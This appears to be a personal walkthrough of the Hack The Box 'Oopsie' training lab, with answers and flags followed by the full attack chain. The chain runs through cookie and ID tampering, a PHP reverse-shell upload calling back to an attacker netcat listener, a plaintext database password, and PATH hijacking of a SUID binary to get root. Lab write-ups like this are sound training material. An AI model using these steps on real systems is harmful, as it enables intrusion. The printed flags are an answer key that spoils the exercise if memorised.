@@ -1,0 +1,162 @@
+Hack The Box 
+Machine: Oopsie
+Part of the starting point tier 2 series
+Difficulty: Very Easy 
+Google Docs: https://docs.google.com/document/d/1ihvVLrp6f3M7qOgIDRXew0neoLEqodcce8eTaJA6gtc/edit?usp=sharing
+
+Q1: With what kind of tool can we intercept web traffic?
+A1: proxy
+
+Q2: What is the path to the directory on the webserver that returns a login page?
+A2: /cdn-cgi/login
+
+Q3: What can be modified in Firefox to get access to the upload page?
+A3: cookie
+
+Q4: What is the access ID of the admin user?
+A4: 34322
+
+Q5: On uploading a file, what direcotry does that file appear in on the server?
+A5: /uploads
+
+Q6: What is the file that contains the password that is shared with the robert user?
+A6: db.php
+
+Q7: What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group?
+A7: find
+
+Q8: Regardless of which user starts running the bugtracker executable, what user privileges will it use to run?
+A8: root
+
+Q9: What does SUID stand for?
+A9: set owner user id
+
+Q10: What is the name of the executable being called in an insecure manner?
+A10: cat
+
+Q 11: Submit the user flag
+A11: f2c74ee8db7983851ab2a96a44eb7981
+
+Q12: Submit the root flag
+A12 :af13b0bee69f8a877c3faf667f7beacf
+
+Step 1:
+	Run nmap on the target machine to see what kind of services are running
+nmap -sv <target_IP>
+
+	Scan Results:
+	PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+we see that there is an Apache webserver running on port 80 and port 22 is open to ssh traffic.
+
+Step 2:
+	We will run dirb on the webserver and see what it finds
+dirb <target_IP>
+	Results:
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.129.78.113/ ----
+==> DIRECTORY: http://10.129.78.113/css/                                                                                    
+==> DIRECTORY: http://10.129.78.113/fonts/                                                                                  
+==> DIRECTORY: http://10.129.78.113/images/                                                                                 
++ http://10.129.78.113/index.php (CODE:200|SIZE:10932)                                                                      
+==> DIRECTORY: http://10.129.78.113/js/                                                                                     
++ http://10.129.78.113/server-status (CODE:403|SIZE:278)                                                                    
+==> DIRECTORY: http://10.129.78.113/themes/                                                                                 
+==> DIRECTORY: http://10.129.78.113/uploads/                                                                                
+                                                                                                                            
+---- Entering directory: http://10.129.78.113/css/ ----                                                                                                                       
+---- Entering directory: http://10.129.78.113/fonts/ ----                                                                                                                 
+---- Entering directory: http://10.129.78.113/images/ ----                                                                                                                          
+---- Entering directory: http://10.129.78.113/js/ ----
+Unfortunately nothing that really looks like the answer to question 2..
+Checking the hint it looks like we are supposed to spider the site with Burp Suite, which would make sense seeing as how the first question was related to Burp Suite as well. 
+So we will start burpsuite and give that a go.
+In the dashboard tab click new live task and in the menu the pops up make sure to check the Live Passive Crawl, Proxy, and Everything options then click ok.
+Now we open the Burp Suite browser and navigate over to the target IP. Once we have done that we can click the “Target” tab in burpsuite and it will pull up everything the crawler found. On the right hand side we see a GET request with the answer to question 2
+
+
+Step3: 
+	In the Brup browser lets navigate over to <target_IP>/cdn-cgi/login. We don’t have any credentials but there is the option to login as guest so let’s see what happens.
+There is a pulldown menu in the upper right hand corner. If you click on it you can see some various options. click on account and a page opens that displays account information such as Access ID, Name, and Email address tied to the account. 
+If we look at the url we see that each account is assigned an id with a number It will look something like this
+http://10.129.174.179/cdn-cgi/login/admin.php?content=accounts&id=2
+Sometimes we can change that number and see the page associated with that ID. an admin user would probably be 0 or 1 so we will give those a try and see if that gets us the answer to question 4. It was 1 and we got it on the first try. 
+
+
+
+
+Step 4: 
+	We got the answer for question 5 in Step2 when we ran dirb. So we will try to gain access to the uploads page. Navigate over to it in the Burp browser with intercept turned on
+http://<target_IP>/cdn-cgi/login/admin.php?content=uploads
+intercept will display a cookie that is basically just the access ID and name we just found for the guest account. So change that to the admin accounts values and the click forward
+
+This will now give us access to the uploads page which we can use our admin privileges to attempt to upload a reverse shell. We can tell by the url that a .php script may work. so in the terminal enter the command
+locate webshell | grep -e “php”
+
+a short list of files should appear, we are interested in this one (location may be different depending on your OS)
+/usr/share/webshells/php/php-reverse-shell.php
+
+open a terminal and create a listener using netcat 
+nc -l <Attack_IP> <port>
+
+You will need to open the file containing the script for the reverse shell and edit the IP address and port to match what you set your listener to be. 
+
+
+Once that is done navigate back over to the Burp Browser and upload the reverse shell file (you will need to remember to re-enter the admin credentials in the interceptor 
+
+Now that we have our listener going and our reverse shell uploaded we access our reverse shell in the /uploads directory through the web browser.
+http://{TARGET_IP}/uploads/php-reverse-shell.php
+our listener should now have access to the reverse shell.
+
+enter the following command to give ourselves a more functional shell 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+from here we can explore the file system a little bit, if we move to the home directory we see there is a user directory named robert, if we move inside of that directory we find a text file with the user flag for the machine “f2c74ee8db7983851ab2a96a44eb7981” 
+
+This will be useful later but not quite what we are looking for now
+After digging around the file system for a while the answer to Question 6 is finally found in the 
+/var/www/html/cdn/cgi/login directory. Inside of which is a file “db.php” 
+
+if we cat the db.php file we can find user roberts login credentials
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!,'garage');
+?>
+
+
+Step 5.
+	Now that we have robert's username and password we can login as him and get an idea for what that user can do
+su robert
+password : M3g4C0rpUs3r!
+if we run the id command we see that robert is not a sudo user and he is only in 1 group unrelated to himself called “bugtracker”
+
+We can use the following command to find out if there is any executable file the bugtracker group has access to
+find / -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+are the results we find
+
+if we try to run the executable we see that the binary expects the user to enter a file that it will read with cat. Since the binary is running under SUID privileges we can take advantage of this.
+
+Navigate over to the /tmp directory and create a file named cat containing the single line /bin/sh
+now use chmod +x to make the cat file executable
+
+Now enter the following command to add the /tmp directory to the PATH environmental variable
+export PATH=/tmp:$PATH
+now just enter “bugtracker” into the command line and press anything, this should exploit our cat file. Typing whoami will reveal we are now root. From here you can navigate over to the root directory in which there will be a file called root.txt containing the root flag “af13b0bee69f8a877c3faf667f7beacf”
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
